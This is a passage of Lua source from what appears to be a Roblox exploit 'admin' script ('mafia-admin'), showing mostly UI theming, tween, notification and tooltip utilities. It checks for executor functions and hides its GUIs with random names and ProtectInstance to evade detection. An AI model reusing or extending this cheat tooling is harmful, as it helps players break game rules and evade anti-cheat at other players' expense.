    end)
    if (not next(Players) and not noerror) then
errored = true
standing = false
wait(0.7)
if errored == true then
errored = false
standing = false
attackinglol = false
ExecuteCommand("unattack", {}, LocalPlayer);
ExecuteCommand("summon", {}, LocalPlayer);
wait(0.5)
ExecuteCommand("summon", {}, LocalPlayer);

end
    end
    return Players
end

local AddConnection = function(Connection, CEnv, TblOnly)
    if (CEnv) then
        CEnv[#CEnv + 1] = Connection
        if (TblOnly) then
            return Connection
        end
    end
    Connections[#Connections + 1] = Connection
    return Connection
end

local LastCommand = {}

--IMPORT [ui]
Guis = {}
ParentGui = function(Gui, Parent)
    Gui.Name = sub(gsub(GenerateGUID(Services.HttpService, false), '-', ''), 1, random(25, 30))
    ProtectInstance(Gui);
    Gui.Parent = Parent or Services.CoreGui
    Guis[#Guis + 1] = Gui
    return Gui
end
UI = Clone(Services.InsertService:LoadLocalAsset("rbxassetid://7882275026"));
UI.Enabled = true

local CommandBarPrefix;

local ConfigUI = UI.Config
local ConfigElements = ConfigUI.GuiElements
local CommandBar = UI.CommandBar
local Commands = UI.Commands
local ChatLogs = UI.ChatLogs
local Console = UI.Console
local GlobalChatLogs = Clone(UI.ChatLogs);
local HttpLogs = Clone(UI.ChatLogs);
local Notification = UI.Notification
local Command = UI.Command
local ChatLogMessage = UI.Message
local GlobalChatLogMessage = Clone(UI.Message);
local NotificationBar = UI.NotificationBar

CommandBarOpen = false
CommandBarTransparencyClone = Clone(CommandBar);
ChatLogsTransparencyClone = Clone(ChatLogs);
ConsoleTransparencyClone = Clone(Console);
GlobalChatLogsTransparencyClone = Clone(GlobalChatLogs);
HttpLogsTransparencyClone = Clone(HttpLogs);
CommandsTransparencyClone = nil
ConfigUIClone = Clone(ConfigUI);
PredictionText = ""
do
    local UIParent = CommandBar.Parent
    GlobalChatLogs.Parent = UIParent
    GlobalChatLogMessage.Parent = UIParent
    GlobalChatLogs.Name = "GlobalChatLogs"
    GlobalChatLogMessage.Name = "GlobalChatLogMessage"

    HttpLogs.Parent = UIParent
    HttpLogs.Name = "HttpLogs"
    HttpLogs.Size = UDim2.new(0, 421, 0, 260);
    HttpLogs.Search.PlaceholderText = "Search"
end
-- position CommandBar
CommandBar.Position = UDim2.new(0.5, -100, 1, 5);

local UITheme, Values;
do
    local BaseBGColor = Color3.fromRGB(32, 33, 36);
    local BaseTransparency = 0.25
    local BaseTextColor = Color3.fromRGB(220, 224, 234);
    local BaseValues = { BackgroundColor = BaseBGColor, Transparency = BaseTransparency, TextColor = BaseTextColor }
    Values = { Background = clone(BaseValues), CommandBar = clone(BaseValues), CommandList = clone(BaseValues), Notification = clone(BaseValues), ChatLogs = clone(BaseValues), Config = clone(BaseValues) }
    local Objects = keys(Values);
    local GetBaseMT = function(Object)
        return setmetatable({}, {
            __newindex = function(self, Index, Value)
                local type = typeof(Value);
                if (Index == "BackgroundColor") then
                    if (Value == "Reset") then
                        Value = BaseBGColor
                        type = "Color3"
                    end
                    assert(type == 'Color3', format("invalid argument #3 (Color3 expected, got %s)", type));
                    if (Object == "Background") then
                        CommandBar.BackgroundColor3 = Value
                        Notification.BackgroundColor3 = Value
                        Command.BackgroundColor3 = Value
                        ChatLogs.BackgroundColor3 = Value
                        ChatLogs.Frame.BackgroundColor3 = Value
                        Console.BackgroundColor3 = Value
                        Console.Frame.BackgroundColor3 = Value
                        HttpLogs.BackgroundColor3 = Value
                        HttpLogs.Frame.BackgroundColor3 = Value
                        UI.ToolTip.BackgroundColor3 = Value
                        ConfigUI.BackgroundColor3 = Value
                        ConfigUI.Container.BackgroundColor3 = Value
                        Commands.BackgroundColor3 = Value
                        Commands.Frame.BackgroundColor3 = Value
                        local Children = GetChildren(UI.NotificationBar);
                        for i = 1, #Children do
                            local Child = Children[i]
                            if (IsA(Child, "GuiObject")) then
                                Child.BackgroundColor3 = Value
                            end
                        end
                        local Children = GetChildren(Commands.Frame.List);
                        for i = 1, #Children do
                            local Child = Children[i]
                            if (IsA(Child, "GuiObject")) then
                                Child.BackgroundColor3 = Value
                            end
                        end
                        for i, v in next, Values do
                            Values[i].BackgroundColor = Value
                        end
                    elseif (Object == "CommandBar") then
                        CommandBar.BackgroundColor3 = Value
                    elseif (Object == "Notification") then
                        Notification.BackgroundColor3 = Value
                        local Children = GetChildren(UI.NotificationBar);
                        for i = 1, #Children do
                            local Child = Children[i]
                            if (IsA(Child, "GuiObject")) then
                                Child.BackgroundColor3 = Value
                            end
                        end
                    elseif (Object == "CommandList") then
                        Commands.BackgroundColor3 = Value
                        Commands.Frame.BackgroundColor3 = Value
                    elseif (Object == "Command") then
                        Command.BackgroundColor3 = Value
                    elseif (Object == "ChatLogs") then
                        ChatLogs.BackgroundColor3 = Value
                        ChatLogs.Frame.BackgroundColor3 = Value
                        HttpLogs.BackgroundColor3 = Value
                        HttpLogs.Frame.BackgroundColor3 = Value
                    elseif (Object == "Console") then
                        Console.BackgroundColor3 = Value
                        Console.Frame.BackgroundColor3 = Value
                    elseif (Object == "Config") then
                        ConfigUI.BackgroundColor3 = Value
                        ConfigUI.Container.BackgroundColor3 = Value
                    end
                    Values[Object][Index] = Value
                elseif (Index == "TextColor") then
                    if (Value == "Reset") then
                        Value = BaseTextColor
                        type = "Color3"
                    end
                    assert(type == 'Color3', format("invalid argument #3 (Color3 expected, got %s)", type));
                    if (Object == "Notification") then
                        Notification.Title.TextColor3 = Value
                        Notification.Message.TextColor3 = Value
                        Notification.Close.TextColor3 = Value
                    elseif (Object == "CommandBar") then
                        CommandBar.Input.TextColor3 = Value
                        CommandBar.Arrow.TextColor3 = Value
                    elseif (Object == "CommandList") then
                        Command.CommandText.TextColor3 = Value
                        local Descendants = GetDescendants(Commands);
                        for i = 1, #Descendants do
                            local Descendant = Descendants[i]
                            local IsText = IsA(Descendant, "TextBox") or IsA(Descendant, "TextLabel") or IsA(Descendant, "TextButton");
                            if (IsText) then
                                Descendant.TextColor3 = Value
                            end
                        end
                    elseif (Object == "ChatLogs") then
                        UI.Message.TextColor3 = Value
                    elseif (Object == "Config") then
                        local Descendants = GetDescendants(ConfigUI);
                        for i = 1, #Descendants do
                            local Descendant = Descendants[i]
                            local IsText = IsA(Descendant, "TextBox") or IsA(Descendant, "TextLabel") or IsA(Descendant, "TextButton");
                            if (IsText) then
                                Descendant.TextColor3 = Value
                            end
                        end
                    elseif (Object == "Background") then
                        Notification.Title.TextColor3 = Value
                        Notification.Message.TextColor3 = Value
                        Notification.Close.TextColor3 = Value
                        CommandBar.Input.TextColor3 = Value
                        CommandBar.Arrow.TextColor3 = Value
                        Command.CommandText.TextColor3 = Value
                        UI.Message.TextColor3 = Value
                        local Descendants = GetDescendants(ConfigUI);
                        for i = 1, #Descendants do
                            local Descendant = Descendants[i]
                            local IsText = IsA(Descendant, "TextBox") or IsA(Descendant, "TextLabel") or IsA(Descendant, "TextButton");
                            if (IsText) then
                                Descendant.TextColor3 = Value
                            end
                        end
                        local Descendants = GetDescendants(Commands);
                        for i = 1, #Descendants do
                            local Descendant = Descendants[i]
                            local IsText = IsA(Descendant, "TextBox") or IsA(Descendant, "TextLabel") or IsA(Descendant, "TextButton");
                            if (IsText) then
                                Descendant.TextColor3 = Value
                            end
                        end
                        for i, v in next, Values do
                            Values[i].TextColor = Value
                        end
                    end
                    Values[Object][Index] = Value
                elseif (Index == "Transparency") then
                    if (Value == "Reset") then
                        Value = BaseTransparency
                        type = "number"
                    end
                    assert(type == 'number', format("invalid argument #3 (Color3 expected, got %s)", type));
                    if (Object == "Background") then
                        CommandBar.Transparency = Value
                        Notification.Transparency = Value
                        Command.Transparency = Value + .5
                        ChatLogs.Transparency = Value
                        ChatLogs.Frame.Transparency = Value
                        HttpLogs.Transparency = Value
                        HttpLogs.Frame.Transparency = Value
                        UI.ToolTip.Transparency = Value
                        ConfigUI.Transparency = Value
                        ConfigUI.Container.Transparency = Value + .5
                        Commands.Transparency = Value
                        Commands.Frame.Transparency = Value + .5
                        Values[Object][Index] = Value
                    elseif (Object == "Notification") then
                        Notification.Transparency = Value
                        local Children = GetChildren(UI.NotificationBar);
                        for i = 1, #Children do
                            local Child = Children[i]
                            if (IsA(Child, "GuiObject")) then
                                Child.Transparency = Value
                            end
                        end
                    end
                    Values[Object][Index] = Value
                end
            end,
            __index = function(self, Index)
                return Values[Object][Index]
            end
        })
    end
    UITheme = setmetatable({}, {
        __index = function(self, Index)
            if (Tfind(Objects, Index)) then
                local BaseMt = GetBaseMT(Index);
                self[Index] = BaseMt
                return BaseMt
            end
        end
    })
end

local IsSupportedExploit = isfile and isfolder and writefile and readfile

local GetThemeConfig
local WriteThemeConfig = function(Conf)
    if (IsSupportedExploit and isfolder("mafia-admin")) then
        local ToHSV = Color3.new().ToHSV
        local ValuesToEncode = deepsearchset(Values, function(i, v)
            return typeof(v) == 'Color3'
        end, function(i, v)
            local H, S, V = ToHSV(v);
            return {H, S, V, "Color3"}
        end)
        local Data = JSONEncode(Services.HttpService, ValuesToEncode);
        writefile("mafia-admin/Theme.json", Data);
    end
end

GetThemeConfig = function()
    if (IsSupportedExploit and isfolder("mafia-admin")) then
        if (isfile("mafia-admin/Theme.json")) then
            local Success, Data = pcall(JSONDecode, Services.HttpService, readfile("mafia-admin/Theme.json"));
            if (not Success or type(Data) ~= 'table') then
                WriteThemeConfig();
                return Values
            end
            local DecodedData = deepsearchset(Data, function(i, v)
                return type(v) == 'table' and #v == 4 and v[4] == "Color3"
            end, function(i,v)
                return Color3.fromHSV(v[1], v[2], v[3]);
            end)
            return DecodedData            
        else
            WriteThemeConfig();
            return Values
        end
    else
        return Values
    end
end

local LoadTheme;
do
    local Config = GetConfig();
    CommandBarPrefix = isfolder and (Config.CommandBarPrefix and Enum.KeyCode[Config.CommandBarPrefix] or Enum.KeyCode.Semicolon) or Enum.KeyCode.Semicolon

    local Theme = GetThemeConfig();
    LoadTheme = function(Theme)
        UITheme.Background.BackgroundColor = Theme.Background.BackgroundColor
        UITheme.Background.Transparency = Theme.Background.Transparency

        UITheme.ChatLogs.BackgroundColor = Theme.ChatLogs.BackgroundColor
        UITheme.CommandBar.BackgroundColor = Theme.CommandBar.BackgroundColor
        UITheme.Config.BackgroundColor = Theme.Config.BackgroundColor
        UITheme.Notification.BackgroundColor = Theme.Notification.BackgroundColor
        UITheme.CommandList.BackgroundColor = Theme.Notification.BackgroundColor
        
        UITheme.ChatLogs.TextColor = Theme.ChatLogs.TextColor
        UITheme.CommandBar.TextColor = Theme.CommandBar.TextColor
        UITheme.Config.TextColor = Theme.Config.TextColor
        UITheme.Notification.TextColor = Theme.Notification.TextColor
        UITheme.CommandList.TextColor = Theme.Notification.TextColor

        UITheme.ChatLogs.Transparency = Theme.ChatLogs.Transparency
        UITheme.CommandBar.Transparency = Theme.CommandBar.Transparency
        UITheme.Config.Transparency = Theme.Config.Transparency
        UITheme.Notification.Transparency = Theme.Notification.Transparency
        UITheme.CommandList.Transparency = Theme.Notification.Transparency
    end
    LoadTheme(Theme);
end
--END IMPORT [ui]



--IMPORT [utils]
Utils.Tween = function(Object, Style, Direction, Time, Goal)
    local TweenService = Services.TweenService
    local TInfo = TweenInfo.new(Time, Enum.EasingStyle[Style], Enum.EasingDirection[Direction])
    local Tween = TweenService.Create(TweenService, Object, TInfo, Goal)

    Tween.Play(Tween)

    return Tween
end

Utils.MultColor3 = function(Color, Delta)
    local clamp = math.clamp
    return Color3.new(clamp(Color.R * Delta, 0, 1), clamp(Color.G * Delta, 0, 1), clamp(Color.B * Delta, 0, 1));
end

Utils.Click = function(Object, Goal) -- Utils.Click(Object, "BackgroundColor3")
    local Hover = {
        [Goal] = Utils.MultColor3(Object[Goal], 0.9)
    }

    local Press = {
        [Goal] = Utils.MultColor3(Object[Goal], 1.2)
    }

    local Origin = {
        [Goal] = Object[Goal]
    }

    AddConnection(CConnect(Object.MouseEnter, function()
        Utils.Tween(Object, "Sine", "Out", .5, Hover);
    end));

    AddConnection(CConnect(Object.MouseLeave, function()
        Utils.Tween(Object, "Sine", "Out", .5, Origin);
    end));

    AddConnection(CConnect(Object.MouseButton1Down, function()
        Utils.Tween(Object, "Sine", "Out", .3, Press);
    end));

    AddConnection(CConnect(Object.MouseButton1Up, function()
        Utils.Tween(Object, "Sine", "Out", .4, Hover);
    end));
end

Utils.Blink = function(Object, Goal, Color1, Color2) -- Utils.Click(Object, "BackgroundColor3", NormalColor, OtherColor)
    local Normal = {
        [Goal] = Color1
    }

    local Blink = {
        [Goal] = Color2
    }

    local Tween = Utils.Tween(Object, "Sine", "Out", .5, Blink)
    CWait(Tween.Completed);

    Tween = Utils.Tween(Object, "Sine", "Out", .5, Normal)
    CWait(Tween.Completed);
end

Utils.Hover = function(Object, Goal)
    local Hover = {
        [Goal] = Utils.MultColor3(Object[Goal], 0.9)
    }

    local Origin = {
        [Goal] = Object[Goal]
    }

    AddConnection(CConnect(Object.MouseEnter, function()
        Utils.Tween(Object, "Sine", "Out", .5, Hover);
    end));

    AddConnection(CConnect(Object.MouseLeave, function()
        Utils.Tween(Object, "Sine", "Out", .5, Origin);
    end));
end

Utils.Draggable = function(Ui, DragUi)
    local DragSpeed = 0
    local StartPos
    local DragToggle, DragInput, DragStart, DragPos

    DragUi = Dragui or Ui
    local TweenService = Services.TweenService

    local function UpdateInput(Input)
        local Delta = Input.Position - DragStart
        local Position = UDim2.new(StartPos.X.Scale, StartPos.X.Offset + Delta.X, StartPos.Y.Scale, StartPos.Y.Offset + Delta.Y)

        Utils.Tween(Ui, "Linear", "Out", .25, {
            Position = Position
        });
        local Tween = TweenService.Create(TweenService, Ui, TweenInfo.new(0.25), {Position = Position});
        Tween.Play(Tween);
    end

    AddConnection(CConnect(Ui.InputBegan, function(Input)
        if ((Input.UserInputType == Enum.UserInputType.MouseButton1 or Input.UserInputType == Enum.UserInputType.Touch) and Services.UserInputService.GetFocusedTextBox(Services.UserInputService) == nil) then
            DragToggle = true
            DragStart = Input.Position
            StartPos = Ui.Position

            AddConnection(CConnect(Input.Changed, function()
                if (Input.UserInputState == Enum.UserInputState.End) then
                    DragToggle = false
                end
            end));
        end
    end));

    AddConnection(CConnect(Ui.InputChanged, function(Input)
        if (Input.UserInputType == Enum.UserInputType.MouseMovement or Input.UserInputType == Enum.UserInputType.Touch) then
            DragInput = Input
        end
    end));

    AddConnection(CConnect(Services.UserInputService.InputChanged, function(Input)
        if (Input == DragInput and DragToggle) then
            UpdateInput(Input)
        end
    end));
end

Utils.SmoothScroll = function(content, SmoothingFactor) -- by Elttob
    -- get the 'content' scrolling frame, aka the scrolling frame with all the content inside
    -- if smoothing is enabled, disable scrolling
    content.ScrollingEnabled = false

    -- create the 'input' scrolling frame, aka the scrolling frame which receives user input
    -- if smoothing is enabled, enable scrolling
    local input = Clone(content)

    input.ClearAllChildren(input);
    input.BackgroundTransparency = 1
    input.ScrollBarImageTransparency = 1
    input.ZIndex = content.ZIndex + 1
    input.Name = "_smoothinputframe"
    input.ScrollingEnabled = true
    input.Parent = content.Parent

    -- keep input frame in sync with content frame
    local function syncProperty(prop)
        AddConnection(CConnect(GetPropertyChangedSignal(content, prop), function()
            if prop == "ZIndex" then
                -- keep the input frame on top!
                input[prop] = content[prop] + 1
            else
                input[prop] = content[prop]
            end
        end));
    end

    syncProperty "CanvasSize"
    syncProperty "Position"
    syncProperty "Rotation"
    syncProperty "ScrollingDirection"
    syncProperty "ScrollBarThickness"
    syncProperty "BorderSizePixel"
    syncProperty "ElasticBehavior"
    syncProperty "SizeConstraint"
    syncProperty "ZIndex"
    syncProperty "BorderColor3"
    syncProperty "Size"
    syncProperty "AnchorPoint"
    syncProperty "Visible"

    -- create a render stepped connection to interpolate the content frame position to the input frame position
    local smoothConnection = AddConnection(CConnect(RenderStepped, function()
        local a = content.CanvasPosition
        local b = input.CanvasPosition
        local c = SmoothingFactor
        local d = (b - a) * c + a

        content.CanvasPosition = d
    end));

    AddConnection(CConnect(content.AncestryChanged, function()
        if content.Parent == nil then
            Destroy(input);
            Disconnect(smoothConnection);
        end
    end));
end

Utils.TweenAllTransToObject = function(Object, Time, BeforeObject) -- max transparency is max object transparency, swutched args bc easier command
    local Descendants = GetDescendants(Object);
    local OldDescentants = GetDescendants(BeforeObject);
    local Tween -- to use to wait

    Tween = Utils.Tween(Object, "Sine", "Out", Time, {
        BackgroundTransparency = BeforeObject.BackgroundTransparency
    })

    for i = 1, #Descendants do
        local v = Descendants[i]
        local IsText = IsA(v, "TextBox") or IsA(v, "TextLabel") or IsA(v, "TextButton")
        local IsImage = IsA(v, "ImageLabel") or IsA(v, "ImageButton")
        local IsScrollingFrame = IsA(v, "ScrollingFrame")

        if (IsA(v, "GuiObject")) then
            if (IsText) then
                Utils.Tween(v, "Sine", "Out", Time, {
                    TextTransparency = OldDescentants[i].TextTransparency,
                    TextStrokeTransparency = OldDescentants[i].TextStrokeTransparency,
                    BackgroundTransparency = OldDescentants[i].BackgroundTransparency
                })
            elseif (IsImage) then
                Utils.Tween(v, "Sine", "Out", Time, {
                    ImageTransparency = OldDescentants[i].ImageTransparency,
                    BackgroundTransparency = OldDescentants[i].BackgroundTransparency
                })
            elseif (IsScrollingFrame) then
                Utils.Tween(v, "Sine", "Out", Time, {
                    ScrollBarImageTransparency = OldDescentants[i].ScrollBarImageTransparency,
                    BackgroundTransparency = OldDescentants[i].BackgroundTransparency
                })
            else
                Utils.Tween(v, "Sine", "Out", Time, {
                    BackgroundTransparency = OldDescentants[i].BackgroundTransparency
                })
            end
        end
    end

    return Tween
end

Utils.SetAllTrans = function(Object)
    Object.BackgroundTransparency = 1

    local Descendants = GetDescendants(Object);
    for i = 1, #Descendants do
        local v = Descendants[i]
        local IsText = IsA(v, "TextBox") or IsA(v, "TextLabel") or IsA(v, "TextButton")
        local IsImage = IsA(v, "ImageLabel") or IsA(v, "ImageButton")
        local IsScrollingFrame = IsA(v, "ScrollingFrame")

        if (IsA(v, "GuiObject")) then
            v.BackgroundTransparency = 1

            if (IsText) then
                v.TextTransparency = 1
            elseif (IsImage) then
                v.ImageTransparency = 1
            elseif (IsScrollingFrame) then
                v.ScrollBarImageTransparency = 1
            end
        end
    end
end

Utils.TweenAllTrans = function(Object, Time)
    local Tween -- to use to wait

    Tween = Utils.Tween(Object, "Sine", "Out", Time, {
        BackgroundTransparency = 1
    })

    local Descendants = GetDescendants(Object);
    for i = 1, #Descendants do
        local v = Descendants[i]
        local IsText = IsA(v, "TextBox") or IsA(v, "TextLabel") or IsA(v, "TextButton")
        local IsImage = IsA(v, "ImageLabel") or IsA(v, "ImageButton")
        local IsScrollingFrame = IsA(v, "ScrollingFrame")

        if (IsA(v, "GuiObject")) then
            if (IsText) then
                Utils.Tween(v, "Sine", "Out", Time, {
                    TextTransparency = 1,
                    BackgroundTransparency = 1
                })
            elseif (IsImage) then
                Utils.Tween(v, "Sine", "Out", Time, {
                    ImageTransparency = 1,
                    BackgroundTransparency = 1
                })
            elseif (IsScrollingFrame) then
                Utils.Tween(v, "Sine", "Out", Time, {
                    ScrollBarImageTransparency = 1,
                    BackgroundTransparency = 1
                })
            else
                Utils.Tween(v, "Sine", "Out", Time, {
                    BackgroundTransparency = 1
                })
            end
        end
    end

    return Tween
end

Utils.TextSize = function(Object)
    local TextService = Services.TextService
    return TextService.GetTextSize(TextService, Object.Text, Object.TextSize, Object.Font, Vector2.new(Object.AbsoluteSize.X, 1000)).Y
end

Utils.Notify = function(Caller, Title, Message, Time)
    if (not Caller or Caller == LocalPlayer) then
        local Notification = UI.Notification
        local NotificationBar = UI.NotificationBar

        local Clone = Clone(Notification)

        local function TweenDestroy()
            if (Utils and Clone) then
                local Tween = Utils.TweenAllTrans(Clone, .25)

                CWait(Tween.Completed)
                Destroy(Clone);
            end
        end

        Clone.Message.Text = Message
        Clone.Title.Text = Title or "Notification"
        Utils.SetAllTrans(Clone)
        Utils.Click(Clone.Close, "TextColor3")
        Clone.Visible = true
	    Clone.Size = UDim2.fromOffset(Clone.Size.X.Offset, Utils.TextSize(Clone.Message) + Clone.Size.Y.Offset - Clone.Message.TextSize);
        Clone.Parent = NotificationBar

        coroutine.wrap(function()
            local Tween = Utils.TweenAllTransToObject(Clone, .5, Notification)

            CWait(Tween.Completed);
            wait(Time or 5);

            if (Clone) then
                TweenDestroy();
            end
        end)()

        AddConnection(CConnect(Clone.Close.MouseButton1Click, TweenDestroy));
        if (Title ~= "Warning" and Title ~= "Error") then
print("warning")
        end

        return Clone
    else
print("whitelisted a user")
    end
end

Utils.MatchSearch = function(String1, String2)
    return String1 == sub(String2, 1, #String1);
end

Utils.StringFind = function(Table, String)
    for _, v in ipairs(Table) do
        if (Utils.MatchSearch(String, v)) then
            return v
        end
    end
end

Utils.GetPlayerArgs = function(Arg)
    Arg = lower(Arg);
    local SpecialCases = {"all", "others", "random", "me", "nearest", "farthest", "npcs", "allies", "enemies"}
    if (Utils.StringFind(SpecialCases, Arg)) then
        return Utils.StringFind(SpecialCases, Arg);
    end

    local CurrentPlayers = GetPlayers(Players);
    for i, v in next, CurrentPlayers do
        local Name, DisplayName = v.Name, v.DisplayName
        if (Name ~= DisplayName and Utils.MatchSearch(Arg, lower(DisplayName))) then
            return lower(DisplayName);
        end
        if (Utils.MatchSearch(Arg, lower(Name))) then
            return lower(Name);
        end
    end
end

Utils.ToolTip = function(Object, Message)
    local CloneToolTip
    local TextService = Services.TextService

    AddConnection(CConnect(Object.MouseEnter, function()
        if (Object.BackgroundTransparency < 1 and not CloneToolTip) then
            local TextSize = TextService.GetTextSize(TextService, Message, 12, Enum.Font.Gotham, Vector2.new(200, math.huge)).Y > 24

            CloneToolTip = Clone(UI.ToolTip)
            CloneToolTip.Text = Message
            CloneToolTip.TextScaled = TextSize
            CloneToolTip.Visible = true
            CloneToolTip.Parent = UI
        end
    end))

    AddConnection(CConnect(Object.MouseLeave, function()
        if (CloneToolTip) then
            Destroy(CloneToolTip);
            CloneToolTip = nil
        end
    end))

    if (LocalPlayer) then
        AddConnection(CConnect(Mouse.Move, function()
            if (CloneToolTip) then
                CloneToolTip.Position = UDim2.fromOffset(Mouse.X + 10, Mouse.Y + 10)
            end
        end))
    else
        delay(3, function()
            LocalPlayer = Players.LocalPlayer
            AddConnection(CConnect(Mouse.Move, function()
                if (CloneToolTip) then
                    CloneToolTip.Position = UDim2.fromOffset(Mouse.X + 10, Mouse.Y + 10)
                end
            end))
        end)
    end
end

Utils.ClearAllObjects = function(Object)
    local Children = GetChildren(Object);
    for i = 1, #Children do
        local Child = Children[i]
        if (IsA(Child, "GuiObject")) then
            Destroy(Child);
        end
    end
end

Utils.Rainbow = function(TextObject)
    local Text = TextObject.Text
    local Frequency = 1 -- determines how quickly it repeats
    local TotalCharacters = 0
    local Strings = {}

    TextObject.RichText = true

    for Character in gmatch(Text, ".") do
        if match(Character, "%s") then
            Strings[#Strings + 1] = Character
        else
            TotalCharacters = TotalCharacters + 1
            Strings[#Strings + 1] = {'<font color="rgb(%i, %i, %i)">' .. Character .. '</font>'}
        end
    end

    local Connection = AddConnection(CConnect(Heartbeat, function()
        local String = ""
        local Counter = TotalCharacters

        for _, CharacterTable in ipairs(Strings) do
            local Concat = ""

            if (type(CharacterTable) == "table") then
                Counter = Counter - 1
                local Color = Color3.fromHSV(-atan(math.tan((tick() + Counter/math.pi)/Frequency))/math.pi + 0.5, 1, 1)

                CharacterTable = format(CharacterTable[1], floor(Color.R * 255), floor(Color.G * 255), floor(Color.B * 255))
            end

            String = String .. CharacterTable
        end

        TextObject.Text = String .. " "
    end));
    delay(150, function()
        Disconnect(Connection);
    end)

end

Utils.Vector3toVector2 = function(Vector)
    local Tuple = WorldToViewportPoint(Camera, Vector);
    return Vector2New(Tuple.X, Tuple.Y);
end

Utils.AddTag = function(Tag)
    if (not Tag) then
        return
    end
    local PlrCharacter = GetCharacter(Tag.Player)
    if (not PlrCharacter) then
        return
    end
    local Billboard = InstanceNew("BillboardGui");
    Billboard.Parent = UI
    Billboard.Name = GenerateGUID(Services.HttpService);
    Billboard.AlwaysOnTop = true
    Billboard.Adornee = FindFirstChild(PlrCharacter, "Head") or nil
    Billboard.Enabled = FindFirstChild(PlrCharacter, "Head") and true or false
    Billboard.Size = UDim2.new(0, 200, 0, 50)
    Billboard.StudsOffset = Vector3New(0, 4, 0);

    local TextLabel = InstanceNew("TextLabel", Billboard);
    TextLabel.Name = GenerateGUID(Services.HttpService);
    TextLabel.TextStrokeTransparency = 0.6
    TextLabel.BackgroundTransparency = 1
    TextLabel.TextColor3 = Color3.new(0, 255, 0);
    TextLabel.Size = UDim2.new(0, 200, 0, 50);
    TextLabel.TextScaled = false
    TextLabel.TextSize = 15
    TextLabel.Text = format("%s (%s)", Tag.Name, Tag.Tag);

    if (Tag.Rainbow) then
        Utils.Rainbow(TextLabel)
    end
    if (Tag.Colour) then
        local TColour = Tag.Colour
        TextLabel.TextColor3 = Color3.fromRGB(TColour[1], TColour[2], TColour[3]);
    end

    local Added = AddConnection(CConnect(Tag.Player.CharacterAdded, function()
        Billboard.Adornee = WaitForChild(Tag.Player.Character, "Head");
    end));

    AddConnection(CConnect(Players.PlayerRemoving, function(plr)
        if (plr == Tag.Player) then
            Disconnect(Added);
            Destroy(Billboard);
        end
    end))
end

Utils.TextFont = function(Text, RGB)
    RGB = concat(RGB, ",")
    local New = {}
    gsub(Text, ".", function(x)
        New[#New + 1] = x
    end)
    return concat(map(New, function(i, letter)
        return format('<font color="rgb(%s)">%s</font>', RGB, letter)
    end)) .. " "
end

Utils.Thing = function(Object)
    local Container = InstanceNew("Frame");
    local Hitbox = InstanceNew("ImageButton");
    local UDim2fromOffset = UDim2.fromOffset

    Container.Name = "Container"
    Container.Parent = Object.Parent
    Container.BackgroundTransparency = 1.000
    Container.BorderSizePixel = 0
    Container.Position = Object.Position
    Container.ClipsDescendants = true
    Container.Size = UDim2fromOffset(Object.AbsoluteSize.X, Object.AbsoluteSize.Y);
    Container.ZIndex = Object
    
    Object.AutomaticSize = Enum.AutomaticSize.X
    Object.Size = UDim2.fromScale(1, 1)
    Object.Position = UDim2.fromScale(0, 0)
    Object.Parent = Container
    Object.TextTruncate = Enum.TextTruncate.None
    Object.ZIndex = Object.ZIndex + 2
    
    Hitbox.Name = "Hitbox"
    Hitbox.Parent = Container.Parent
    Hitbox.BackgroundTransparency = 1.000
    Hitbox.Size = Container.Size
    Hitbox.Position = Container.Position
    Hitbox.ZIndex = Object.ZIndex + 2
    
    local MouseOut = true
    
    AddConnection(CConnect(Hitbox.MouseEnter, function()
        if Object.AbsoluteSize.X > Container.AbsoluteSize.X then
            MouseOut = false
            repeat
                local Tween1 = Utils.Tween(Object, "Quad", "Out", .5, {
                    Position = UDim2fromOffset(Container.AbsoluteSize.X - Object.AbsoluteSize.X, 0);
                })
                CWait(Tween1.Completed);
                wait(.5);
                local Tween2 = Utils.Tween(Object, "Quad", "Out", .5, {
                    Position = UDim2fromOffset(0, 0);
                })
                CWait(Tween2.Completed);
                wait(.5);
            until MouseOut
        end
    end))

    AddConnection(CConnect(Hitbox.MouseLeave, function()
        MouseOut = true
        Utils.Tween(Object, "Quad", "Out", .25, {
            Position = UDim2fromOffset(0, 0);
        });
    end))
    
    return Object
end

function Utils.Intro(Object)
	local Frame = InstanceNew("Frame");
	local UICorner = InstanceNew("UICorner");
	local CornerRadius = FindFirstChild(Object, "UICorner") and Object.UICorner.CornerRadius or UDim.new(0, 0)
    local UDim2fromOffset  = UDim2.fromOffset

	Frame.Name = "IntroFrame"
	Frame.ZIndex = 1000
	Frame.Size = UDim2fromOffset(Object.AbsoluteSize.X, Object.AbsoluteSize.Y)
	Frame.AnchorPoint = Vector2.new(.5, .5)
	Frame.Position = UDim2.new(Object.Position.X.Scale, Object.Position.X.Offset + (Object.AbsoluteSize.X / 2), Object.Position.Y.Scale, Object.Position.Y.Offset + (Object.AbsoluteSize.Y / 2))
	Frame.BackgroundColor3 = Object.BackgroundColor3
	Frame.BorderSizePixel = 0

	UICorner.CornerRadius = CornerRadius
	UICorner.Parent = Frame

	Frame.Parent = Object.Parent

	if (Object.Visible) then
		Frame.BackgroundTransparency = 1

		local Tween = Utils.Tween(Frame, "Quad", "Out", .25, {
			BackgroundTransparency = 0
		});

		CWait(Tween.Completed);
		Object.Visible = false

		local Tween = Utils.Tween(Frame, "Quad", "Out", .25, {
			Size = UDim2fromOffset(0, 0);
		});

		Utils.Tween(UICorner, "Quad", "Out", .25, {
			CornerRadius = UDim.new(1, 0)
		});

		CWait(Tween.Completed);
		Destroy(Frame);
	else
		Frame.Visible = true
		Frame.Size = UDim2fromOffset(0, 0)
		UICorner.CornerRadius = UDim.new(1, 0)

		local Tween = Utils.Tween(Frame, "Quad", "Out", .25, {
			Size = UDim2fromOffset(Object.AbsoluteSize.X, Object.AbsoluteSize.Y)
		});

		Utils.Tween(UICorner, "Quad", "Out", .25, {
			CornerRadius = CornerRadius
		});

		CWait(Tween.Completed);
		Object.Visible = true

		local Tween = Utils.Tween(Frame, "Quad", "Out", .25, {
			BackgroundTransparency = 1
		})

		CWait(Tween.Completed);
		Destroy(Frame);
	end
end

Utils.MakeGradient = function(ColorTable)
	local Table = {}
    local ColorSequenceKeypointNew = ColorSequenceKeypoint.new
	for Time, Color in next, ColorTable do
		Table[#Table + 1] = ColorSequenceKeypointNew(Time - 1, Color);
	end
	return ColorSequence.new(Table)
end

Utils.Debounce = function(Func)
	local Debounce = false

	return function(...)
		if (not Debounce) then
			Debounce = true
			Func(...);
			Debounce = false
		end
	end
end

Utils.ToggleFunction = function(Container, Enabled, Callback) -- fpr color picker
    local Switch = Container.Switch
    local Hitbox = Container.Hitbox
    local Color3fromRGB = Color3.fromRGB
    local UDim2fromOffset = UDim2.fromOffset

